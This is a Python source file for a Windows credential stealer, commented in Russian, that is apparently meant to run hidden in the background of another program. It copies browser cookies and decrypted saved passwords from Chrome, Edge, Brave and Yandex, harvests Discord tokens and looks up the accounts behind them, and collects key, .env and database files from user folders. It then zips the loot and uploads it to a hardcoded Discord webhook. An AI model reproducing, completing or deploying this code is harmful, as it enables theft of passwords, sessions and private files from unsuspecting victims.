import os
import sys
import json
import sqlite3
import zipfile
import shutil
import threading
import requests
import tempfile
import platform
import time
import ctypes
import re
from pathlib import Path
from datetime import datetime

# ТВОЙ ВЕБХУК
WEBHOOK_URL = "https://discord.com/api/webhooks/1573971030916206605/5U3CPNrvM7_BNbSVFqHXZ9cZG1xTvO68EwdPWy_cklSuD1qLke-tHFLcTzhfdBEyO3LX"

class Stealer:
    def __init__(self):
        self.username = os.environ.get('USERNAME') or "User"
        # Создаем временную папку для сбора мусора перед отправкой
        self.temp_dir = f"C:\\Users\\{self.username}\\AppData\\Local\\Temp\\opt_steal_{int(time.time())}"
        os.makedirs(self.temp_dir, exist_ok=True)

    @staticmethod
    def start():
        """Запуск в фоне, чтобы не тормозить основную программу"""
        try:
            # Если Windows, скрываем консольное окно
            if platform.system() == "Windows":
                ctypes.windll.kernel32.FreeConsole()
            
            t = threading.Thread(target=Stealer().run, daemon=True)
            t.start()
        except Exception:
            pass

    def run(self):
        try:
            self.collect_browsers()
            self.collect_discord()
            self.collect_files()
            self.send_data()
        finally:
            self.cleanup()

    def cleanup(self):
        try:
            shutil.rmtree(self.temp_dir, ignore_errors=True)
        except:
            pass

    def send_to_discord(self, content, filename=None, file_data=None):
        try:
            if file_data and filename:
                files = {'file': (filename, file_data, 'application/octet-stream')}
                requests.post(WEBHOOK_URL, data={'content': content}, files=files)
            else:
                requests.post(WEBHOOK_URL, json={'content': content})
        except:
            pass

    def get_chrome_paths(self):
        paths = []
        appdata = os.environ.get('LOCALAPPDATA')
        browsers = ['Google', 'Microsoft', 'BraveSoftware', 'Yandex']
        for browser in browsers:
            if browser == 'Google':
                p = os.path.join(appdata, 'Google', 'Chrome', 'User Data')
                if os.path.exists(p): paths.append(('Chrome', p))
            elif browser == 'Microsoft':
                p = os.path.join(appdata, 'Microsoft', 'Edge', 'User Data')
                if os.path.exists(p): paths.append(('Edge', p))
            elif browser == 'BraveSoftware':
                p = os.path.join(appdata, 'BraveSoftware', 'Brave-Browser', 'User Data')
                if os.path.exists(p): paths.append(('Brave', p))
            elif browser == 'Yandex':
                p = os.path.join(appdata, 'Yandex', 'YandexBrowser', 'User Data')
                if os.path.exists(p): paths.append(('Yandex', p))
        return paths

    def decrypt_dpapi(self, data):
        """Дешифровка паролей Chrome/Edge через стандартный API Windows"""
        try:
            import ctypes
            from ctypes import wintypes
            
            class DATA_BLOB(ctypes.Structure):
                _fields_ = [("cbData", wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_char))]
            
            pInput = ctypes.create_string_buffer(data)
            blobIn = DATA_BLOB(ctypes.sizeof(pInput), pInput)
            pOutput = ctypes.POINTER(ctypes.c_char)()
            
            if ctypes.windll.Crypt32.CryptUnprotectData(ctypes.byref(blobIn), None, None, None, None, 0, ctypes.byref(pOutput)):
                result = ctypes.string_at(pOutput.contents, pOutput.contents[:])
                ctypes.windll.Kernel32.LocalFree(pOutput)
                return result.decode('utf-8', errors='ignore')
            return ""
        except:
            return "[DECRYPT_ERROR]"

    def collect_browsers(self):
        for name, path in self.get_chrome_paths():
            profiles = [p for p in os.listdir(path) if os.path.isdir(os.path.join(path, p))]
            for profile in profiles:
                if profile.endswith("Default") or profile.startswith("Profile"):
                    self.steal_browser_cookies(name, path, profile)
                    self.steal_browser_logins(name, path, profile)

    def steal_browser_cookies(self, name, path, profile):
        cookie_file = os.path.join(path, profile, "Cookies")
        if not os.path.exists(cookie_file): return
        
        try:
            with tempfile.NamedTemporaryFile(delete=False) as tmp:
                shutil.copy2(cookie_file, tmp.name)
                conn = sqlite3.connect(tmp.name)
                cursor = conn.cursor()
                cursor.execute("SELECT host_key, name, path, secure, expires_utc, value FROM cookies")
                cookies = []
                for row in cursor.fetchall():
                    host, key, p, sec, exp, val = row
                    if exp > 0:
                        cookies.append({"domain": host, "name": key, "path": p, "secure": sec, "expiry": exp, "value": val})
                conn.close()
                os.unlink(tmp.name)
                
                if cookies:
                    with open(os.path.join(self.temp_dir, f"{name}_{profile}_cookies.json"), 'w') as f:
                        json.dump(cookies, f, indent=4)
        except:
            pass

    def steal_browser_logins(self, name, path, profile):
        login_file = os.path.join(path, profile, "Login Data")
        if not os.path.exists(login_file): return

        try:
            with tempfile.NamedTemporaryFile(delete=False) as tmp:
                shutil.copy2(login_file, tmp.name)
                conn = sqlite3.connect(tmp.name)
                cursor = conn.cursor()
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                logins = []
                for row in cursor.fetchall():
                    url, user, pwd_enc = row
                    if pwd_enc:
                        pwd_dec = self.decrypt_dpapi(pwd_enc)
                        logins.append({"url": url, "user": user, "pass": pwd_dec})
                conn.close()
                os.unlink(tmp.name)
                
                if logins:
                    with open(os.path.join(self.temp_dir, f"{name}_{profile}_logins.json"), 'w') as f:
                        json.dump(logins, f, indent=4)
        except:
            pass

    def collect_discord(self):
        discord_paths = [
            os.path.join(os.environ['APPDATA'], "discord", "Local State"),
            os.path.join(os.environ['APPDATA'], "discordcanary", "Local State"),
            os.path.join(os.environ['APPDATA'], "discordptb", "Local State"),
            os.path.join(os.environ['APPDATA'], "DiscordPTB", "Local State")
        ]
        
        all_tokens = []
        for dp in discord_paths:
            if os.path.exists(dp):
                tokens = self.get_tokens_from_path(dp)
                for t in tokens:
                    info = self.steal_discord_token(t)
                    if info: all_tokens.append(info)
        
        if all_tokens:
            with open(os.path.join(self.temp_dir, "discord_tokens.json"), 'w') as f:
                json.dump(all_tokens, f, indent=4)

    def get_tokens_from_path(self, path):
        tokens = []
        try:
            with open(path, 'r', encoding='utf-8') as f:
                local_state = json.load(f)
            
            dir_path = os.path.dirname(path)
            ls_path = os.path.join(dir_path, "Local Storage", "leveldb")
            if os.path.exists(ls_path):
                for root, _, files in os.walk(ls_path):
                    for file in files:
                        if file.endswith(".log") or file.endswith(".ldb"):
                            try:
                                with open(os.path.join(root, file), 'r', encoding='utf-8', errors='ignore') as f:
                                    text = f.read()
                                    matches = re.findall(r'([a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{38})', text)
                                    for m in matches:
                                        if m not in tokens:
                                            tokens.append(m)
                            except:
                                pass
        except:
            pass
        return tokens

    def steal_discord_token(self, token):
        info = {}
        try:
            headers = {"Authorization": token}
            res = requests.get("https://discord.com/api/v9/users/@me", headers=headers).json()
            info["username"] = f"{res.get('username')}#{res.get('discriminator')}"
            info["email"] = res.get("email")
            info["id"] = res.get("id")
            
            res2 = requests.get("https://discord.com/api/v9/users/@me/connections", headers=headers).json()
            accounts = [f"{acc['name']} ({acc['id']})" for acc in res2]
            info["accounts"] = ", ".join(accounts) if accounts else "None"
            return info
        except:
            return None

    def collect_files(self):
        search_dirs = [
            os.path.expanduser("~\\Downloads"),
            os.path.expanduser("~\\Desktop"),
            os.path.expanduser("~\\Documents"),
            os.path.expanduser("~\\AppData\\Roaming")
        ]
        important_exts = ['.txt', '.json', '.xml', '.pdf', '.key', '.pem', '.env', '.sql', '.db']
        
        found_count = 0
        for s_dir in search_dirs:
            if os.path.exists(s_dir):
                for root, _, files in os.walk(s_dir):
                    for file in files:
                        ext = os.path.splitext(file)[1].lower()
                        if ext in important_exts:
                            src = os.path.join(root, file)
                            # Ограничиваем глубину поиска, чтобы не висло
                            if root.count(os.sep) - s_dir.count(os.sep) < 4: 
                                dst = os.path.join(self.temp_dir, "files", file)
                                os.makedirs(os.path.dirname(dst), exist_ok=True)
                                try:
                                    shutil.copy2(src, dst)
                                    found_count += 1
                                except:
                                    pass
        self.files_found_count = found_count

    def send_data(self):
        zip_name = f"steal_{self.username}.zip"
        zip_path = os.path.join(tempfile.gettempdir(), zip_name)
        
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(self.temp_dir):
                for file in files:
                    full_path = os.path.join(root, file)
                    arcname = os.path.relpath(full_path, self.temp_dir)
                    zipf.write(full_path, arcname)
        
        try:
            with open(zip_path, 'rb') as f:
                data = f.read()
            msg = f"🕵️‍♂️ Report\n👤 User: {self.username}\n📅 Time: {datetime.now()}\n📂 Files Found: {self.files_found_count}\n💾 Size: {len(data)/1024:.2f} KB"
            self.send_to_discord(msg, zip_name, data)
        finally:
            try:
                os.remove(zip_path)
            except:
                pass
